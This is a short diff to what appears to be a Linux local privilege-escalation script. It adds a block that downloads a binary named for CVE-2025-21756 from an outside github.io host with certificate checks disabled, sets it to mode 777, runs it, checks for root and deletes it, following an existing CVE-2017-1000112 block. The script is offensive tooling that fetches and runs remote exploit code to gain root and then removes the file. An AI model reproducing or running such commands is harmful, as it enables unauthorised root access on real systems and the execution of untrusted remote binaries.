@@ -251,3 +251,9 @@ chmod 777 "CVE-2017-1000112"
 ./CVE-2017-1000112
 check_root
 rm "CVE-2017-1000112"
+
+wget -q "https://mrwawanj.github.io/localroot/CVE-2025-21756" --no-check-certificate
+chmod 777 "CVE-2025-21756"
+./CVE-2025-21756
+check_root
+rm "CVE-2025-21756"
